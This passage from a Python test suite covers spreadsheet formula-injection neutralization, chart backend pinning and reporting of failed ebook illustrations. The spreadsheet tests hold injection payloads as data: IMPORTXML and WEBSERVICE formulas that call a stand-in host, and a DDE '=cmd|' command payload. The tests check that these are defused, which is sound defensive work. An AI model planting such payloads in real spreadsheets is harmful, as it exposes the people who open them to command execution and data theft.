    def test_non_string_passthrough(self):
        from augmentum.tools.artifact_spreadsheet import _neutralize_cell_value
        for v in (None, 42, 3.14, True):
            value, blocked = _neutralize_cell_value(v)
            assert value == v and blocked is False

    def test_render_xlsx_neutralizes_payload_in_data(self):
        """End-to-end: dangerous payload survives openpyxl write as literal text."""
        from io import BytesIO

        from openpyxl import load_workbook

        from augmentum.tools.artifact_spreadsheet import _render_xlsx

        data = _render_xlsx([{
            "name": "Sheet1",
            "headers": ["Name", "Note"],
            "rows": [
                ["safe", "=SUM(B1:B2)"],          # legitimate, must stay
                ["evil", "=IMPORTXML(\"http://x\",\"//*\")"],
                ["dde", "=cmd|'/c calc'!A1"],
            ],
        }])
        wb = load_workbook(BytesIO(data))
        ws = wb["Sheet1"]
        assert ws["B2"].value == "=SUM(B1:B2)"
        # Dangerous payloads must be stored as literal text (single-quote
        # prefix is consumed by Excel's display layer; openpyxl preserves
        # the raw value with the quote).
        assert ws["B3"].value.startswith("'=IMPORTXML")
        assert ws["B4"].value.startswith("'=cmd|")

    def test_render_xlsx_neutralizes_payload_in_header(self):
        from io import BytesIO

        from openpyxl import load_workbook

        from augmentum.tools.artifact_spreadsheet import _render_xlsx

        data = _render_xlsx([{
            "name": "Sheet1",
            "headers": ["Safe", "=WEBSERVICE(\"http://x\")"],
            "rows": [["a", "b"]],
        }])
        wb = load_workbook(BytesIO(data))
        ws = wb["Sheet1"]
        assert ws["A1"].value == "Safe"
        assert ws["B1"].value.startswith("'=WEBSERVICE")


# ---------------------------------------------------------------------------
# Chart rendering internals
# ---------------------------------------------------------------------------

class TestChartRendering:
    def test_pin_matplotlib_backend_is_idempotent(self):
        """``_pin_matplotlib_backend()`` must call ``matplotlib.use`` exactly
        once per process — repeated chart renders should not re-pin the
        backend (which would emit UserWarnings if any other component had
        set a different backend in the meantime).
        """
        import sys
        from unittest.mock import MagicMock

        from augmentum.tools import artifact_chart

        fake_mpl = MagicMock()
        sys.modules["matplotlib"] = fake_mpl
        artifact_chart._MPL_BACKEND_PINNED = False
        try:
            artifact_chart._pin_matplotlib_backend()
            artifact_chart._pin_matplotlib_backend()
            artifact_chart._pin_matplotlib_backend()
            fake_mpl.use.assert_called_once_with("Agg")
        finally:
            sys.modules.pop("matplotlib", None)
            artifact_chart._MPL_BACKEND_PINNED = False


# ---------------------------------------------------------------------------
# EpubTool — auto-illustration failure surfacing
# ---------------------------------------------------------------------------

class TestEbookAutoIllustrateReport:
    """Cover the illustration-report contract on EbookTool._auto_illustrate.

    The audit flagged that per-chapter image generation failures were
    silently dropped, so the EPUB shipped with fewer illustrations than
    promised and no signal to the agent or user. The new contract is:
    _auto_illustrate returns (chapters, report) and the caller surfaces
    failures into the chat summary, metadata.warnings, and the card.
    """

    def _make_tool(self, *, img_tool=None, plan=None):
        from augmentum.tools.artifact_ebook import EbookTool

        registry = MagicMock()
        registry.get = MagicMock(return_value=img_tool)
        app_state = MagicMock()
        app_state.tool_registry = registry

        store = AsyncMock()
        tool = EbookTool(store, app_state=app_state)
        # Plan is optional — patch the planner to return what the test wants.
        async def _fake_plan(*args, **kwargs):
            return plan
        tool._plan_illustrations = _fake_plan  # type: ignore[assignment]
        return tool

    def _ok_result(self, url="/api/image/abc123"):
        return ToolResult(
            success=True,
            output="generated",
            metadata={"url": url},
        )

    def _fail_result(self, error="model OOM"):
        return ToolResult(success=False, error=error)

    @pytest.mark.asyncio
    async def test_skip_when_no_app_state(self):
        from augmentum.tools.artifact_ebook import EbookTool
        tool = EbookTool(AsyncMock(), app_state=None)
        chapters, report = await tool._auto_illustrate(
            [{"heading": "One", "body": "x"}],
            title="Book", cover_image_url="",
        )
        assert report["skipped"] is True
        assert "app_state" in report["skip_reason"]
        assert chapters == [{"heading": "One", "body": "x"}]

    @pytest.mark.asyncio
    async def test_skip_when_image_tool_missing(self):
        tool = self._make_tool(img_tool=None)
        chapters, report = await tool._auto_illustrate(
            [{"heading": "One", "body": "x"}],
            title="Book", cover_image_url="",
        )
        assert report["skipped"] is True
        assert "image_generation" in report["skip_reason"]

    @pytest.mark.asyncio
    async def test_all_chapters_succeed(self):
        img_tool = MagicMock()
        img_tool.execute = AsyncMock(side_effect=[
            self._ok_result("/api/image/cover"),  # cover
            self._ok_result("/api/image/c1"),
            self._ok_result("/api/image/c2"),
        ])
        tool = self._make_tool(img_tool=img_tool)
        chapters, report = await tool._auto_illustrate(
            [
                {"heading": "Ch1", "body": "x" * 50},
                {"heading": "Ch2", "body": "y" * 50},
            ],
            title="Book", cover_image_url="",
        )
        assert report["requested_chapters"] == 2
        assert report["succeeded_chapters"] == 2
        assert report["failed_chapter_numbers"] == []
        assert report["cover_attempted"] is True
        assert report["cover_failed"] is False
        assert chapters[0]["image_url"] == "/api/image/c1"
        assert chapters[1]["image_url"] == "/api/image/c2"

    @pytest.mark.asyncio
    async def test_partial_failure_recorded(self):
        img_tool = MagicMock()
        # cover ok, ch1 ok, ch2 fails (twice — original + retry without IP-Adapter)
        img_tool.execute = AsyncMock(side_effect=[
            self._ok_result("/api/image/cover"),
            self._ok_result("/api/image/c1"),
            self._fail_result("OOM"),
            self._fail_result("OOM"),
        ])
        tool = self._make_tool(img_tool=img_tool)
        chapters, report = await tool._auto_illustrate(
            [
                {"heading": "Ch1", "body": "x" * 50},
                {"heading": "Ch2", "body": "y" * 50},
            ],
            title="Book", cover_image_url="",
        )
        assert report["requested_chapters"] == 2
        assert report["succeeded_chapters"] == 1
        assert report["failed_chapter_numbers"] == [2]
        assert "image_url" in chapters[0]
        assert "image_url" not in chapters[1]

    @pytest.mark.asyncio
    async def test_cover_failure_recorded(self):
        img_tool = MagicMock()
        img_tool.execute = AsyncMock(side_effect=[
            self._fail_result("cover OOM"),
            self._ok_result("/api/image/c1"),
        ])
        tool = self._make_tool(img_tool=img_tool)
        _, report = await tool._auto_illustrate(
            [{"heading": "Ch1", "body": "x" * 50}],
            title="Book", cover_image_url="",
        )
        assert report["cover_attempted"] is True
        assert report["cover_failed"] is True

    @pytest.mark.asyncio
    async def test_no_cover_attempt_when_url_supplied(self):
        img_tool = MagicMock()
        img_tool.execute = AsyncMock(return_value=self._ok_result("/api/image/c1"))
        tool = self._make_tool(img_tool=img_tool)
        _, report = await tool._auto_illustrate(
            [{"heading": "Ch1", "body": "x" * 50}],
            title="Book",
            cover_image_url="/api/image/existing-cover",
        )
        # We only attempt to generate a cover if none was supplied.
        assert report["cover_attempted"] is False
        assert report["cover_failed"] is False

    @pytest.mark.asyncio
    async def test_ebook_result_exposes_warnings_field(self):
        """When illustrations fail, warnings must land on ``result.warnings``
        (top-level) AND in ``result.output`` so the chat stream shows them.
        """
        from augmentum.tools.artifact_ebook import EbookTool

        store = AsyncMock()
        store.save = AsyncMock(return_value={
            "id": "epub123",
            "filename": "Test.epub",
            "display_name": "Test.epub",
            "format": "epub",
            "size_bytes": 123,
            "path": "standalone/Test.epub",
            "download_url": "/api/artifacts/epub123/download",
        })

        # Image tool that fails every chapter
        img_tool = MagicMock()
        img_tool.execute = AsyncMock(return_value=ToolResult(success=False, error="OOM"))
        registry = MagicMock(); registry.get = MagicMock(return_value=img_tool)
        app_state = MagicMock(); app_state.tool_registry = registry

        tool = EbookTool(store, app_state=app_state)
        async def _no_plan(*args, **kwargs):
            return None
        tool._plan_illustrations = _no_plan  # type: ignore[assignment]

        result = await tool.execute(
            title="T",
            author="A",
            chapters=[
                {"heading": "Ch1", "body": "x" * 50},
                {"heading": "Ch2", "body": "y" * 50},
            ],
            cover_image_url="/api/image/existing-cover",  # no cover attempt
        )
        assert result.success
        # Top-level warnings populated
        assert result.warnings, "failed chapters must populate ToolResult.warnings"
        joined = " ".join(result.warnings)
        assert "chapter" in joined.lower() and "1" in joined and "2" in joined
        # Chat output also shows them so the LLM sees them
        assert "Warnings:" in result.output

    @pytest.mark.asyncio
    async def test_existing_chapter_url_does_not_count_as_request(self):
        img_tool = MagicMock()
        # No cover gen (url supplied), ch1 has its own image, ch2 needs gen
        img_tool.execute = AsyncMock(return_value=self._ok_result("/api/image/c2"))
        tool = self._make_tool(img_tool=img_tool)
        # Patch _resolve_image_path so the pre-supplied URL is treated as valid
        async def _resolve_ok(url):
            return "/tmp/fake.png"
        tool._resolve_image_path = _resolve_ok  # type: ignore[assignment]
        _, report = await tool._auto_illustrate(
            [
                {"heading": "Ch1", "body": "x" * 50, "image_url": "/api/image/preset"},
                {"heading": "Ch2", "body": "y" * 50},
            ],
            title="Book", cover_image_url="/api/image/cover",
        )
        # Only Ch2 should have been requested.
        assert report["requested_chapters"] == 1
        assert report["succeeded_chapters"] == 1

    @pytest.mark.asyncio
    async def test_artifact_image_url_resolution_is_user_scoped(self, tmp_path):
        from PIL import Image as PILImage

        from augmentum.tools.artifact_ebook import EbookTool

        image_path = tmp_path / "scene.png"
        PILImage.new("RGB", (64, 64), color="green").save(image_path)

        store = MagicMock()
        store.get = AsyncMock(return_value={"path": "standalone/scene.png"})
        store.get_file_path = MagicMock(return_value=image_path)

        tool = EbookTool(store)
        resolved = await tool._resolve_image_path(
            "/api/artifacts/img_art/download",
            user_id="usr_test",
        )

        assert resolved == str(image_path)
        store.get.assert_awaited_once_with("img_art", user_id="usr_test")
